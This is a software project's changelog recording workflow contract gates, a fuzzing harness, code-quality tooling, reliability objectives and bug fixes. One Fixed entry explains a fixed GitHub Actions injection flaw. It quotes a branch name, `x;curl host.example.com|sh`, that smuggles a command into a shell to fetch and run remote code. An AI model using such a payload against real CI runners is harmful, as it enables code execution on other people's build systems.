## [Unreleased — Milestone 5 Prep]

### Added
- **`AGENTS.md` §8.10 gains the empty-check-list case**: `gh pr checks <n> --watch` exits 0 printing `no checks reported` when nothing has registered yet, which on a freshly opened pull request is the normal state for the first seconds. Hit while opening PR #4 — the watch returned success and the five checks it was supposed to wait for all started afterwards. The same shape as the rule it sits beside: `completed` is not `success`, and an empty check list is not a passing one.
- **`AGENTS.md` §8.12 — Use GitHub Issues For Work That Must Outlive the Session**: the repository had two places work lives — `docs/ROADMAP.md` for declared intent and a regenerated `.data/sdlc_backlog.json` for what a scan derives — and no stated boundary for the third. The rule gives one: an issue is for work that is *not* derivable from the tree, must survive the session, and needs a decision or a conversation, and is explicitly not for work being done now, for roadmap deliverables, or for anything the workbench re-derives every pass. Also records searching before opening, labelling from the taxonomy `project_tooling.py triage-issue` already emits, closing with evidence, linking the pull request with `Closes #N`, and one fact that is written nowhere in the workflow files: an issue opened by `GITHUB_TOKEN` does not trigger `issues` workflows, verified here when `recursive-hardening.yml` created one and `autonomous-triage.yml` did not fire.
- **Workflow contract gate** (`tests/test_workflow_contracts.py`): three of the five workflows had never executed once — `pr-sentinel.yml` and `recursive-hardening.yml` fire on `pull_request` and `autonomous-triage.yml` on `issues`, and the repository had zero pull requests and zero issues in its entire history while `ci.yml` accumulated 83 runs. Nothing reads workflow code: `actionlint` checks that the YAML and the shell parse, not that `verify-hardening --diff-file --is-defect` is a command the tool accepts. The gate resolves every workflow's command line against the target script's own argument parser, and asserts that actions are SHA-pinned, permissions are declared, referenced step ids exist, referenced step outputs are actually written, and no `run:` block interpolates a workflow expression. 41 assertions; it failed on three workflows the first time it ran, one of them added in this same release.
- **`AGENTS.md` §8.11 — A Workflow With Zero Runs Is Unverified Code**: count the runs before trusting a workflow; committing straight to `main` is what keeps the pull-request-triggered half of the automation dead; never interpolate `${{ }}` into a `run:` block; a skipped step is not a passed step; and a CLI path only CI invokes is a path only CI tests.
- **`AGENTS.md` §8.10 — A Commit Is Not Delivered Until It Is Pushed and Its Checks Are Green**: the lifecycle documented steps 1 through 6 and never said *push*, so an agent could satisfy every written rule with commits sitting in a local object store — which happened in the session that added the fuzzer. The rule requires pushing in the same pass as the commit, watching the run to a conclusion with `--exit-status` rather than reading `status: completed` as success, checking every matrix job rather than the first, reproducing a red check instead of re-running it, and reading the code scanning alerts the change introduced. It also records why local green does not predict CI green: CI builds a clean checkout across 3.12, 3.13 and 3.14 and runs `actionlint`, the Mermaid render gate and the coverage floor, none of which the inner loop runs.
- **Instrument fuzzing harness and regression corpus** (`tools/fuzz_harness.py`, `tools/fuzz_core.py`, `artifacts/fuzz-corpus/`): every oracle here is a parser aimed at whatever is in the tree, and every one was tested only with inputs an author thought of. The harness generates well-formed Python modules, Markdown documents, roadmap grammars and dependency manifests, damages them with ten mutation operators, and asserts four mechanically decidable properties of eight instruments — no exception outside declared tolerances, identical answers for identical input, convergence when repairing, completion inside a budget. `crosscheck` re-runs every input under three `PYTHONHASHSEED` values in separate processes, which is the only way to see the class of defect that made the cohesion detector report 15, 16 and 17 findings on three consecutive runs of unchanged files. A delta-debugging shrinker reduces a failing input to the lines that still fail it. The corpus is the gate and the search is not: `replay` is deterministic and runs on every push, while exploration runs daily in `fuzz.yml` and publishes minimized inputs as artifacts rather than failing a build on whichever commit happened to be under test when the search got lucky. 45 unit tests, most of which exist to prove a property fires — the first campaign reported nothing across 320 cases, which is indistinguishable from a harness that cannot report.
- **`fuzz` SARIF adapter** (`tools/sarif_report.py`): corpus replay failures reach code scanning alongside the other four oracles, located at the instrument rather than at the fixture. A fixture in `artifacts/fuzz-corpus/` is working as intended; the file that needs editing is the parser it broke.
- **`AGENTS.md` §10a.6 — Point the Instruments at Themselves, and Keep What Broke Them**: the corpus gates and the search does not; a property is not trusted until it has been shown to fire; measure whether the corpus reaches the instrument before believing a clean run; the harness must not carry its own environment into the comparison; store cases under a suffix nothing else reads; verify the entry fails before the fix, not only that it passes after.
- **Backlog reconciliation and lifecycle advancement** (`sdlc_project_manager.py sync [--watch]`): the first roadmap deliverable the loop itself selected, now delivered. A defect card exists because a scan reported a finding, so when the finding stops being reported the card closes — otherwise the board records what was once wrong rather than what is wrong now. Cards are matched by title rather than number, since export order assigns numbers and keying on them would close and reopen every card each pass. Roadmap cards are exempt from closing: no scan can observe an unbuilt feature, so its absence means nothing. Exactly one card is promoted to Ready per pass, because a board where everything is Ready states no order. Reconciliation is idempotent, verified by asserting two passes over unchanged input produce identical boards. 10 unit tests.
- **Observation 14 — Defect-Shaped Loops & the Feature Blind Spot** (`observations/systems/`): the research behind the ingestion work. Defects are derivable from the artifact that contains them; intent is not, because a feature's absence is indistinguishable from a decision not to build it. A loop assembled entirely from inspection tools therefore converges to an empty backlog that reads as completion, and gets quieter and less useful simultaneously — the marginal findings that remain are where instrument error dominates signal, which is how one backlog came to be 83% measurement error.
- **Roadmap ingestion** (`tools/roadmap_ingest.py`): every work generator here is defect-shaped, so the loop could exhaust its mechanically-derivable work while the project's actual plan went untouched — observed directly at 100.0/100 health with **0 backlog items against 11 open roadmap deliverables**. `SDLCResource` already carried `business_value`, `effort_points`, `milestone` and `depends_on`, and the scorer already computed a value-over-effort ratio: the prioritizer was built for features and had never been given one. Open deliverables are now parsed into that shape, sized from the prioritization matrix where a judgement was already recorded, and merged into the same backlog so features and defects are ranked by one arithmetic. Defects outrank features by construction. Rejected anti-pattern rows are never scheduled, items carrying trailing annotations such as "(partially delivered)" are not silently dropped, and an item with no matrix row is marked as assumption-ranked rather than presented with the confidence of a recorded one. 13 unit tests.
- **Dependency policy: adopt reputable open source rather than reimplement it** (`AGENTS.md` §1a): the repository treated "zero-dependency" as a quality in itself. It is not — it is a constraint that buys portability in a copy-pasteable exhibit and costs correctness everywhere else. The cost was measured: a hand-written maintainability index disagreed with `radon`, the reference implementation it was written against, by 18 to 40 points on the same modules. The policy states what qualifies as reputable (maintained, compatibly licensed, proportionate transitive tree, replaceable, auditable) and the obligations that follow (declared in one manifest, consumed behind a narrow seam, the tool's own metric reported rather than paraphrased, removed in the commit that stops using it). Sample apps under `examples/` remain a deliberate, stated exception.
- **`pyproject.toml` as the single dependency manifest**: the list previously lived duplicated across `ci.yml`, `.pre-commit-config.yaml` and `CONTRIBUTING.md` and had already drifted — the pre-push hook shipped without `pyyaml` and `markdown-it-py` and aborted every push until it was hit. CI now installs `.[test]`, and the hooks mirror the manifest.
- **Code Smell Quantifier** (`examples/code-smell-quantifier/`): deterministic measurement of the ten metrics established tooling reports and this repository did not. Surveying `radon`, PMD-CPD, pylint, sonar, import-linter and vulture against what was measured here found 2 of 12 covered — cyclomatic complexity and nesting depth, both pass/fail gates that answer "may this ship" and not "where is this getting worse". Adds maintainability index, Halstead volume, Type-2 clone detection, long parameter lists, long functions, god classes, LCOM4 cohesion, import cycles and unreferenced symbols. Every finding carries the measured value, the cited threshold and the excess. 16 unit tests.
- **Gating versus advisory smells**: each detector is sound as a measurement, and they differ in how confidently a finding becomes an action. Structural breaches gate; LCOM4, clones, dead symbols and maintainability index are advisory with their false-positive modes stated — LCOM4 flags any facade of independent checkers, clone detection flags deliberate boilerplate, dead-symbol detection cannot see reflective access, and MI is dominated by module length.
- **`STRUCTURAL_DECAY` feedback category** (`tools/resource_iteration_workbench.py`): gating smells now enter the self-improvement backlog with their measurement attached, so the loop can act on length, parameter count and responsibility accumulation, which the complexity and depth caps cannot see. The quantifier is imported lazily and optionally, so a checkout without the example degrades the loop rather than breaking it.
- **Pattern — Findings Must Carry Their Own Falsification** (`patterns/`) and a falsification stage appended to the multi-persona reviewer prompt: a 286-finding review of this repository carried executable verification criteria on 274 items — `git check-ignore -v`, `git ls-files`, `grep -n` — and marked all 286 `verified_by: llm`. The criteria were written to be run and nothing ran them, which is how a wrong location, an inverted polarity ("always ERROR" where the exported value was OK) and a deliberate teaching artifact all reached the report. The stage requires executed commands with attached output, quoted locations, explicit observed-versus-expected polarity, an intent check before flagging, and a withdrawal that actually binds. `AGENTS.md` §8.5 covers acting on an inbound review: verify the batch before fixing any of it, and fix the class rather than the instance.
- **`sanitization` rule for prose** (`tools/doc_rules_structure.py`): markdown was never checked for concrete private addresses or internal hostnames, only Python was. Allows CIDR ranges that state the policy and the RFC 5737 blocks it mandates, and requires a justification on any waiver.
- **Observation 13 — Verify the Finding Before You Fix It** (`observations/systems/`): a loop that generates work has no cost signal for generating *wrong* work, because the agent that acts on a phantom finding still produces a green diff and a shrinking backlog. Records the four phantom backlog items, the six first readings across one session that measured the instrument rather than the system, and the four checks that separate them: actionability, denominator, proxy distance, and reproducing before acting. Completes the trilogy with Observation 11 (gates that report success over work never done) and 12 (gates that fire on their author first).
- **Test coverage floor** (`ci.yml`): the repository measured no coverage at all. Baseline is 92.5% across `tools/`, `examples/` and `benchmarks/`, gated at 90% with headroom so an unrelated change does not fail the build. Run separately from the inner loop, since collecting coverage nearly doubles suite time (5.0s → 9.4s) and the loop's value is its latency. Verified in both directions: a 99% floor fails, a 90% floor passes.
- **`project_tooling.py` coverage 62% → 98.3%**: the measurement immediately exposed that `main()` was entirely untested — the entry point `AGENTS.md` §8.1 documents and `autonomous-triage.yml` invokes — along with the whole `GitHubAPIClient`. 8 new tests covering both CLI subcommands, the exit code `recursive-hardening.yml` branches on, token precedence, the request contract (mocked, no network), and the CWE-209 bounded error detail. Same untested-plumbing gap as the sentinel's `main()` in an earlier commit.
- **Agentic Experience Contribution Harness** (`artifacts/prompts/`): five staged prompts turning a real agent session into a publishable observation or pattern — triage, draft, sanitize, adversarial review, and pattern distillation — plus a contributor-facing section in `CONTRIBUTING.md` and an entry point in `README.md`. Every stage can return nothing (`NO_OBSERVATION`, `RETRACTED`, `INSUFFICIENT_RECURRENCE`), because the hard part of contributing is deciding whether there is anything to contribute: an agent asked to write up a session will always produce a document, and a corpus of filler observations is the *toy demos* anti-pattern with better formatting. Triage demands surprise, measured cost, or transferability, and rejects narrated changelogs, unmeasured claims, and lessons that reduce to "be careful".
- **Observation 12 — Gates Catch Their Author First** (`observations/systems/`): six gates were added in one session and five fired on their own author's work within two commits, which is structural rather than coincidental — the author holds the sharpest model of the failure class precisely while producing the most instances of it, and same-session code is the only code in the repository that has passed through no filter at all. The practical inversion: **a new gate that finds nothing on its first run is evidence against the gate**. The one clean first run in this session was the `directory_map` rule registered in `validate_content` but not `validate_file`. Codified in `AGENTS.md` §8.5.
- **Reliability SLO engine** (`tools/reliability_slo.py`): service level objectives and error budgets for the self-improvement loop itself. Five indicators measured as good events over valid events (`gate_pass_rate`, `invariant_compliance`, `feedback_latency`, `headroom_saturation`, `toil_containment`), each with a target, rolling window and rationale; error budget consumption, burn rate with a minimum-sample floor, and a policy table mapping budget state to loop phase. `record` / `status` / `policy` subcommands, with `status` exiting non-zero when remediation is owed. 12 unit tests.
- **Error-budget-driven feedback inversion** (`AGENTS.md` §11, rewritten): the loop phase is now decided by budget state rather than by `health == 100.0`. A binary check is twitchy in one direction (one flaky iteration freezes proactive work) and blind in the other (permanent green cannot distinguish reliable from unambitious). Spending budget below target is explicitly normal operation; `invariant_compliance` carries a 1.0 target and therefore no budget, so a single invariant breach still enters remediation immediately. A budget that closes a full window unspent raises `OBJECTIVE_REVIEW` — the objectives are not steering anything.
- **Committed, merge-safe reliability ledger** (`docs/reliability/iterations/`): an error budget is measured over a rolling window, so a ledger living only in gitignored `.data/` starts empty in every clone and CI run, never matures, and degrades the policy back to judging a single iteration — the binary check it replaced, with more machinery. The ledger is now committed alongside the work it measures, sharded one file per iteration so concurrent branches merge without conflict rather than colliding on a shared array, and pruned to a rolling 100 iterations. It holds nothing but aggregate counts, with no paths or identifiers.
- **Small-sample guard on every objective**: an indicator measured over a handful of events reads `0.000` the moment one of them fails, and freezing the loop on that is the twitchiness the engine exists to remove. Objectives declare `min_valid_events` (default 10) and report `INSUFFICIENT_DATA` below it; zero-budget objectives override the floor to 1, since one resource violating an invariant is a breach however few were measured.
- **Pattern — Error-Budget-Driven Feedback Inversion** (`patterns/`): the SRE reasoning, the golden-signal mapping for a self-improving codebase, why toil earns a fifth indicator with no golden-signal counterpart, and the three design patterns carrying the implementation (Registry/Strategy indicators, frozen value objects, single policy object).
- **Deprecation Lifecycle Sentinel** (`examples/deprecation-lifecycle-sentinel/`): executable release gate for post-1.0 change management. Enforces six contract rules — declared `since`/`remove_in`/`replacement`, mandatory removal once the deadline version arrives, removal scheduled only at a major boundary, a runtime `DeprecationWarning` so callers learn before their build breaks, no internal call sites still using what the project deprecated, and failure on nonexistent audit targets. Ships the `@deprecated` decorator carrying both halves of the contract, which refuses to construct an incomplete one. The major-boundary rule is inert while the major version is `0`, so pre-1.0 repositories keep delete-on-sight freedom and inherit the discipline at the 1.0 boundary. 13 unit tests.
- **Pattern — Post-1.0 Deprecation Lifecycle** (`patterns/`): why both "delete on sight" and "never delete" are wrong after 1.0, why deprecating without a deadline is worse than either, and how agents amplify whichever reflex their instructions last emphasized. `AGENTS.md` §7 now scopes the delete-on-sight rule to the `0.x` major, since nothing in a source tree announces which regime is in force.
- **Workflow lint gate** (`ci.yml`): `actionlint` pinned to 1.7.12 and checksum-verified before execution. The repository gated Python, documentation, JSON schemas and Mermaid, but never its own GitHub Actions workflows — the one surface with direct access to runner credentials.
- **Directory map staleness oracle** (`tools/docs_validator.py`, `directory_map` rule): diffs every embedded `text` directory tree against the filesystem — mapped paths must exist, and a directory the map enumerates must be enumerated completely, judged per kind so a map listing only subdirectories is not faulted for omitting files. Partial listings opt out with an `...` entry. Found five omissions on its first run (`CHANGELOG.md`, `CONTRIBUTING.md`, `pytest.ini`, `benchmarks/README.md`, `tools/verify_mermaid.mjs`), two of which had been absent from the map since the release that introduced them. Box-drawing art that is not a filesystem map (trace waterfalls, AST dumps) is excluded structurally: a map marks at least one child as a directory and most of what it names exists. 6 new unit tests.
- **Mermaid render gate** (`tools/verify_mermaid.mjs`): parses every diagram in the repository with the real Mermaid 11 engine under jsdom, because no textual rule can tell whether a diagram renders. Caught 2 unrenderable diagrams on its first run that passed every regex check. Accepts N paths and fails on missing targets per the gate-integrity pattern. Wired into `ci.yml` and documented in `CONTRIBUTING.md`.
- **22 new diagrams** across the five observations that had none (`devops-cli/18`, `19`, `20`, `systems/09`, `10`), the roadmap, six example READMEs, the contribution decision tree, the gate lifecycle, and the observability stack topology, using the diagram type that matches each mechanism: `stateDiagram-v2` for the one-way embedding batch ratchet (the point being the transitions that do not exist), `sequenceDiagram` for MCP's missing transaction envelope and for silent delegation failure absorption, `quadrantChart` for the value/effort matrix, `timeline` for the milestone arc, `pie` for context-window taxation, and `xychart-beta` for monotonic pipeline context growth.
- **Mermaid accessibility & modernity gates** (`tools/docs_validator.py`): new `mermaid_style` rule computing WCAG 2.1 relative luminance and rejecting any `fill:` declared without an explicit `color:` (an inherited label color flips with the GitHub theme and vanishes against the fill) or any pair below the 4.5:1 AA floor; extended `mermaid` rule rejecting the deprecated `graph` alias. Public `contrast_ratio()` helper. 5 new unit tests, including one asserting the documented palette satisfies the rule that enforces it.
- **Observation 11 — Silent Certification Failure & Gate Integrity** (`observations/systems/`): field study of four gates simultaneously reporting success over work they never performed, and the remediation that closed them.
- **Pattern — Gate Integrity & Total Input Coverage** (`patterns/`): making "nothing was checked" impossible to confuse with "everything passed"; total input coverage, `TargetIntegrity` on missing paths, self-reported metrics over harness wall-clock, and waivers that cannot become mute buttons.
- **Auditable waiver pragmas in the AST invariant sentinel** (`# sentinel: allow[<Invariant>] <justification>`): module-header waivers parsed from real comment tokens via `tokenize`, honored only in the first 15 lines and only for `ZeroTrustSanitization`. Structural caps are never waivable; malformed, unjustified, or non-waivable waivers raise `WaiverIntegrity` and do not suppress the underlying finding. Applied to the 5 fixture modules whose negative tests must embed private IPs. 7 new unit tests.
- **Change Management & Validation hardening** (this release):
  - `.pre-commit-config.yaml`: Git pre-commit / pre-push hooks enforcing the AST invariant sentinel, docs validator, pytest collection check, and JSON schema lint — converting `AGENTS.md` §8 mandates from convention to mechanical enforcement.
  - `CONTRIBUTING.md`: Unified contributor entry-point (previously fragmented across `AGENTS.md`, `docs/CURATION_GUIDELINES.md`, and `.github/` templates).
  - `CHANGELOG.md` (this file): Structured release history.
  - **Observation structure validator** (`tools/docs_validator.py`): New `check_observation_structure` check verifying that every numbered observation document (e.g. `01-foo.md`) under `observations/` contains numbered sections `## 1.` through `## 5.`. Integrated into `validate_file`, `validate_content`, and exposed as a public `DocsValidator.check_observation_structure()` method.
  - 4 new unit tests for observation structure: valid doc, missing sections, exempt non-observation files, real-repo compliance sweep.

### Changed
- **Parameter objects replace parallel arguments**: the four genuine long-parameter findings are resolved. `_FenceScan` replaces an untyped `list[Any]` plus spread scalars in the two fence scanners; `FunctionReading` replaces a seven-element tuple built in one place and unpacked positionally in another, where a reordering would have type-checked and silently mislabelled every field; `ExtractionOutcome` replaces title/content/links passed separately through the crawler.
- **Cycle detection delegated to `networkx`**: the hand-rolled version was a depth-first walk that cleared its own stack mid-iteration to emit "one representative cycle per group" — a heuristic sitting at the nesting ceiling, approximating an algorithm with a correct published implementation. networkx carries no hard dependencies, so the proportionality test in the new dependency policy is satisfied.
- **The loop stopped paying for findings it discards**: the workbench consumes `report.gating` and drops everything else, while `analyze()` computed every advisory detector regardless. Advisory work is 94% of the runtime on this corpus — vulture alone is roughly eight seconds against one for everything that gates. `analyze(include_advisory=False)` takes the loop's smell analysis from 11.84s to 1.31s for byte-identical gating output.
- **Directory map validation scans each parent once instead of stat-ing every entry**: one `os.scandir` per parent answers both questions the rules ask — does this entry exist with its declared kind, and what does the directory contain that the map omits. Per-entry stat-ing asked the filesystem the same thing once per entry, which on this virtualised mount costs 0.764ms against 0.001ms on tmpfs. Whole-corpus map validation: 2.69s to 0.25s.
- **Quantifier delegates to `radon` and `vulture`**: maintainability index, Halstead volume and cyclomatic complexity now come from radon rather than from a hand-written restatement of its formulae, and unreferenced code from vulture, which reports unused imports, variables, attributes and unreachable code with a confidence score — where the hand-written detector saw only module-level definitions and graded every finding identically. It immediately found a dead `SUPPORTED_EXTENSIONS` import left by an earlier refactor that the hand-written version could not see. What remains bespoke is what no tool provided: clone detection calibrated to this corpus, LCOM4, the gating/advisory split and the loop integration.
- **Roadmap compacted and its status labels corrected**: `docs/ROADMAP.md` was the largest document in the repository at 4,295 words, carrying 38 delivered items against 11 open ones — a forward-looking document in which the next action was the hardest thing to find. Milestones 1 through 3 are complete and now live verbatim in [`docs/archive/delivered-milestones-v0.1-to-v0.3.md`](./docs/archive/delivered-milestones-v0.1-to-v0.3.md), summarised in the roadmap by a three-row table (4,295 → 3,195 words). Milestone 4 was labelled "Planned" while 11 of its 12 items were delivered, and is now "In Flight". The Milestone 6 deprecation item was partially delivered by the deprecation lifecycle sentinel and now records what shipped and what remains, rather than reading as untouched.
- **Pattern headers converged on one vocabulary**: nineteen patterns carried three competing schemas — nine used `Pattern Type`/`Target Audience`, some used `Category`/`Applicability`, four had only a prose subtitle and one had nothing. All now open with `Pattern Class`, `Problem`, `Solution` and an optional `Reference Implementation`, with existing prose preserved and every cited implementation path verified to exist. The new `pattern_header` rule makes the schema mechanical rather than conventional, verified by renaming a field and confirming the gate fails.
- **`docs_validator.py` split into focused modules**: 1,507 lines doing eight distinct jobs became 1,031, with `doc_core.py` (93 lines: finding types, fenced-block extraction) shared by `doc_rules_mermaid.py` (241 lines) and `doc_rules_structure.py` (222 lines). Rule modules depend only on the core, never on each other or on the validator that orchestrates them, so there is no import cycle. An agent changing a Mermaid rule now reads 241 lines instead of 1,507. Extraction was done by AST span rather than by hand, and every module was checked for unresolved names before the suite ran.
- **Directory map oracle stats each path once**: every mapped entry was stat-ed twice — once to decide whether a block is a map at all, then again to verify the entry exists with its declared kind. A per-document cache cuts filesystem calls across a full validation from 467 to 375 (−20%). Measured by syscall count rather than wall clock, which was too noisy on the development host to attribute reliably.
- **Deduplicated the whole-corpus documentation sweep**: the same repository-wide validation ran four times — `test_all_vibes_documentation_clean`, a second real-repo structure test, the `--strict` CI step, and a separate observation-structure CI step. Observation structure findings are errors, so the whole-repo sweep already subsumes the structure pass; verified by breaking an observation and confirming both survivors fail. Removed the duplicate test and CI step: full suite 5.7s → 5.0s, full workbench iteration 10.2s → 8.7s, one CI step fewer.
- **Superseded inversion trigger reconciled**: `patterns/deterministic-oracles-and-feedback-inversion.md` still taught that the loop inverts "as soon as the health score reaches 100.0/100", which `AGENTS.md` §11 stopped doing when the error budget policy landed — live contradictory guidance between a published pattern and the operating instructions. The pattern now records the binary trigger as superseded and points at the budget policy that subsumes it.
- **`pytest.ini` records why xdist stays disabled**: measured, not assumed. This suite's cost is import and collection, not execution, so sixteen worker interpreters each re-importing the corpus made `-n auto` 26% *slower* (7.2s vs 5.7s serial).
- **Pattern title convention**: `tool-cardinality-budget-management.md` was the one file of nineteen missing the `# Pattern:` prefix.
- **Root layout claim corrected in `CONTRIBUTING.md`**: it asserted that only `README.md`, `LICENSE` and `AGENTS.md` live in the repository root, untrue since `CHANGELOG.md` and `CONTRIBUTING.md` were added — the same stale claim already corrected in `AGENTS.md` §3 when the directory map oracle first ran.
- **Directory maps moved to the bottom of their documents** (`README.md`, `resources/README.md`, `resources/k8s/README.md`, `examples/go-leak-sentinel/README.md`): a 145-line file listing was the first thing a reader met on the repository homepage, pushing the actual exhibition below it. A tree is reference material, and an agent needing the layout runs `ls` rather than reading a copy that can go stale. All four were kept rather than deleted because their entries state what each file is *for*, which the filesystem does not; `AGENTS.md` §6 now records the placement rule and the deletion test for bare listings.
- **Warm pytest session for repository sweeps** (`tools/resource_iteration_workbench.py`): every test suite now runs in one pytest session with per-file attribution parsed from a JUnit `xunit1` report, rather than one subprocess per file. Measured: 20.1s → 11.4s per full iteration (43% faster); the fixed interpreter, plugin-loading and collection cost accounted for 6.2s of an 11.8s test phase and is now paid once. Suites missing from the session fall back to their own subprocess, so the fast path cannot swallow a resource. Totals are also more accurate — attribution comes from test cases rather than parsed summary text, which had been undercounting.
- **`_budget_status` decomposed into named predicates**: the classifier reached M=7 as guards accumulated. Conditions are now properties on a `BudgetSample` value object (`is_undersampled`, `is_exhausted`, `is_burning`, `is_unspent`) resolved through an ordered rule table, so precedence is the list order and nothing else.
- **Single rule registry in the docs validator**: `validate_file` and `validate_content` each carried their own list of checks, so the `directory_map` rule added to one silently did not run on the other — including the CLI path, which is how it was discovered. Both now delegate to `_run_all_checks`, the one place a rule is registered, with a test asserting the two entry points return identical findings.
- **Unified fenced-block extraction**: the Mermaid and directory-map rules each hand-rolled a fence state machine, the second reaching M=7/depth=5 through an `elif` ladder — the AST nesting trap `AGENTS.md` §10.1 documents. Both now share `_extract_fenced_blocks`, and the dead `_is_mermaid_start` helper is removed.
- **Sentinel headroom restored** (`examples/ast-invariant-sentinel/sentinel.py`): the waiver and multi-path work left `_iter_header_comments` at M=5/depth=4 and `_expand_targets` at M=4/depth=4, which the workbench ranked as the repository's top proactive item. `_header_tokens` now separates *which tokens* (an `itertools.takewhile` generator bounded to the module header) from *which of them are comments*, and target expansion chains the per-path generators into a first-wins ordered mapping. Both land at depth 2 with no behavioural change.

### Fixed
- **The self-hardening audit's detector was a keyword scan over the whole patch**: it counted added lines containing `mandate`, `rule`, `guardrail`, `prohibited` or `must always` anywhere in the diff, so a line containing "rule" in an unrelated file satisfied the AGENTS.md mandate, while a real guardrail reading "Never rebuild text by splitting on a marker and re-joining it" scored zero — and the workflow opened an issue demanding hardening that had already been written, with a message claiming `AGENTS.md` was not updated when it had been. The count is now scoped to the `AGENTS.md` hunk and counts the instruction lines the file gained; both diff header forms are recognised, since a patch fragment carries only `+++`; and the touched-but-empty case has its own message. 5 unit tests.
- **The onboarding comment `autonomous-triage.yml` posts rendered its own heading wrong**: the step splits the triage plan on `### 🤖 Autonomous Project Grounding` and re-joined it with `parts[1].trim()`, which ate the space and produced `Grounding— Issue #5`. It is gated on `action == 'opened'` and the workflow's first execution came from an edit, so the step had never run until an issue was opened to exercise it — and it was wrong on that first run. Now slices from the marker instead of splitting and re-joining.
- **`recursive-hardening.yml` could never have worked, and proved it on its first execution**: it ran `git diff origin/BASE...MERGE_SHA`, but a merged pull request's commit is an ancestor of the base, so the three-dot range takes that commit as its own merge base and returns an empty diff — under squash, merge and rebase alike. The verifier read the empty patch as "AGENTS.md was not updated" and opened an issue accusing a pull request that had added an entire section to `AGENTS.md` of skipping it. Measured on the merge that exposed it: 0 files from the broken range, 12 from `MERGE_SHA^1..MERGE_SHA`. The range is fixed, an empty diff is now a hard error rather than a verdict, and `tests/test_workflow_contracts.py` requires every job that generates a diff to test some file it wrote for emptiness — verified in both directions, against the fixed workflows and the pre-fix form.
- **Two of the four instruments that scan this repository still used an unpruned `rglob`**: `sentinel.py` with no arguments audited `node_modules` and exited non-zero on a vendored package, and `smell_quantifier._python_files` excluded `__pycache__` alone. Observation 16 had closed this for `tools/`, and the agreement test written to prevent its return compared the two instruments that live there — the two that were already correct. Both sample applications now prune during traversal, and `tests/test_source_tree_policy.py` compares all four against the policy on the real tree and on a fixture, so the guard holds in a clean clone where no `node_modules` happens to exist.
- **`pr-sentinel.yml` labelled a pull request `certified-by-sentinel` when the audit had been skipped**: the sentinel step was guarded on `files_count > 0` while the label step ran under `if: success()`, so a documentation-only change was certified by an audit that never executed — Observation 11's failure mode inside the workflow named after the sentinel. The audit now runs unconditionally and reports when it had nothing to do.
- **Two workflows interpolated attacker-controllable refs directly into shell commands**: `pr-sentinel.yml` used `origin/${{ github.base_ref }}` and `recursive-hardening.yml` `origin/${{ ...base.ref }}...${{ ...merge_commit_sha }}`. Git permits `;`, `$`, `(`, `)`, `|` and backticks in a ref name, so a branch named `x;curl host.example.com|sh` becomes two commands on the runner. Both now pass the values through `env:`, the rule `autonomous-triage.yml` already applied to an issue body and which the new contract gate now enforces on every workflow — including `fuzz.yml`, added earlier in this release, which it also caught.
- **The fuzzer's own CLI handlers were untested**: `replay` is what `ci.yml` and the pre-push hook execute, and its exit code — the entire gate — was asserted nowhere. The same untested-plumbing gap as `project_tooling.main()` and the sentinel's `main()` before it. 10 CLI tests covering both exit codes of `replay`, the JSON report, `--no-save`, corpus growth, `targets`, `crosscheck`, and the usage error from the `fingerprint` worker; coverage of `tools/fuzz_harness.py` 86% to 98%.
- **`docs_validator.auto_fix_content` dropped one trailing newline per call while reporting zero repairs**: `splitlines()` discards the final terminator, and the rejoin restored it only when the joined text did not already end in one — which a document ending in two or more newlines always does. The text changed and the count said it had not, so a caller checking the count could not see it, and `--fix` on a document with real repairs *and* trailing blank lines silently removed one more line than it reported. Found by the new fuzzer's idempotence property on the 4,000th generated case and minimized by the shrinker to four lines, kept at `artifacts/fuzz-corpus/docs_fix/2c70a7f1ccbda495.case`. Verified in both directions: reverting the repair makes `replay` exit non-zero.
- **One unscorable module aborted the entire code smell scan** (`examples/code-smell-quantifier/`): `_parse_module` filters the corpus with `ast.parse` and `_score_module` then handed the same source to radon, which tokenizes independently — the two do not accept the same language. A form feed inside a string literal is valid Python and raises `SyntaxError` out of radon's raw analyser, so a single such file stopped the quantifier reporting anything about the hundreds it could have scored. Scoring now skips the module and says so on stderr, because one silently missing from the score table is indistinguishable from one that scored well. Found by the new fuzzer at seed 90000; kept at `artifacts/fuzz-corpus/smells/f54cb450570a8f93.case`.
- **The fuzzer's own fingerprint reported every instrument as non-deterministic**: the scratch directory is a fresh random name per process and appeared inside every finding's `file_path`, so the first cross-seed run showed all three hash seeds disagreeing for all eight targets. None of it was real. Memory addresses and the scratch path are now normalized out before hashing.
- **…and then reported two more, at 0.3%, because the two normalizations were applied in the wrong order**: addresses were substituted before paths, and `mkdtemp` draws its suffix from a pool containing `0`, `x` and the hex digits, so roughly one scratch directory in three hundred — `vibes-fuzz-8t0x1im` — was rewritten by the address pattern before the path replacement could match it, leaving the directory name inside the hash. It survived every serial investigation (18 consecutive runs of each reported case were identical) because contention raises the number of names drawn, never the odds for one. Isolated by running one fixed input through 420 concurrent workers while printing the normalized `repr` beside the hash. The path is now replaced first, and `crosscheck` confirms a disagreement with a second pass before reporting it, so one anomalous sample in 726 subprocess calls is no longer a nightly red build.
- **Flaky CEGIS convergence test**: the sandboxed patch evaluator allowed 150ms to execute a candidate, so on a loaded host a *correct* patch ran out of budget and the convergence test failed intermittently. The timeout exists to contain a runaway candidate, not to benchmark a legitimate one, and it was doing both. The budget now matches each case's intent — 2s by default, where a runaway `while True: pass` is still caught decisively and legitimate evaluation takes single-digit milliseconds, and an explicit 0.1s wherever the case exists to prove containment. The first version of this fix raised the default without giving the demo's deliberately-runaway patch a short budget, which the loop then reported as a latency breach: suite 2.61s → 3.43s → **1.22s**, faster than before the flake was fixed.
- **God-class detection counted method calls as attributes**: `_class_attribute_names` collected every `self.X` reference, so `self.run_command(...)` and `self.IGNORE_TAGS` counted as instance state. Eleven classes were reported over the seven-attribute ceiling when their real counts were 2 to 7 — at or under it — and every one would have been a refactor of correct code. Attribute ceilings now count assignments only; LCOM4 keeps using references, because cohesion asks whether two methods touch shared state regardless of which one writes it. The loop's backlog was 83% phantom: 12 items became 6, and all 6 were genuine.
- **Three real defects found by the quantifier on its first run**: two byte-identical functions in the context packer differing only in a docstring, now one `_extract_declaration_signature`; `audit_directory`, a compatibility shim left behind when the sentinel gained multi-path support and referenced by nothing; and `LifecycleEventType`, an enum defined, exported, documented nowhere and used nowhere. The `TEST_PARITY` check tested for a companion *filename*, so `doc_core.py`, `doc_rules_mermaid.py` and `doc_rules_structure.py` were reported as untested at 97%, 100% and 97% coverage; satisfying it would have meant creating three redundant files to match a naming pattern. Test parity now asks whether a module is reachable from the test suite's import graph, transitively, and docstring findings cover only module- and class-level functions. Backlog 5 → 0; 4 new tests including an import cycle that must terminate.

